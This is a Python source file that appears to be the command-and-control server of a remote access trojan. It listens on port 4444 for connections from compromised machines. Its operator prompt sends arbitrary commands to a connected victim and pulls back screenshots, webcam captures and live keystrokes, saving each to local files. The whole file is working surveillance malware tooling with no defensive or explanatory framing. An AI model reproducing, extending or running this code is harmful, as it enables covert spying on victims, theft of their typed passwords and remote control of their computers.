import socket
import os

# Function to handle client connection and commands
def handle_client(client_socket):
    while True:
        try:
            # Wait for the client's command
            command = input("COMMAND> ")

            if command.lower() == "exit":
                client_socket.send(command.encode())
                break  # Exit the loop and close the connection

            elif command == "screenshot":
                client_socket.send(command.encode())
                with open("screenshot.png", "wb") as f:
                    data = client_socket.recv(4096)
                    while data:
                        f.write(data)
                        data = client_socket.recv(4096)
                print("[*] Screenshot saved as screenshot.png")

            elif command == "webcam":
                client_socket.send(command.encode())
                with open("webcam.jpg", "wb") as f:
                    data = client_socket.recv(4096)
                    while data:
                        f.write(data)
                        data = client_socket.recv(4096)
                print("[*] Webcam image saved as webcam.jpg")

            elif command == "keylogger":
                client_socket.send(command.encode())
                print("[*] Waiting for keystrokes... (Ctrl+C to stop)")
                with open("keylogs.txt", "w") as f:
                    try:
                        while True:
                            data = client_socket.recv(1024).decode()
                            if not data or data == "STOP_KEYLOG":
                                break
                            f.write(data)
                            print(data)  # Print keystrokes on the server terminal
                    except KeyboardInterrupt:
                        client_socket.send("STOP_KEYLOG".encode())
                        print("[*] Keylogger stopped")
                    except Exception as e:
                        print(f"Keylogger error: {e}")

            else:
                client_socket.send(command.encode())
                response = client_socket.recv(4096).decode()
                print(response)

        except Exception as e:
            print(f"Error handling command: {e}")
            continue  # Keep the loop running despite errors

    client_socket.close()  # Close the socket when exiting

# Function to start the server and listen for incoming connections
def start_server(host="0.0.0.0", port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}...")

    while True:  # Keep accepting new connections
        client_socket, addr = server.accept()
        print(f"[+] Connection from {addr}")
        handle_client(client_socket)
        print("[*] Client disconnected, waiting for new connection...")

    server.close()  # This line won't be reached in this setup

if __name__ == "__main__":
    start_server()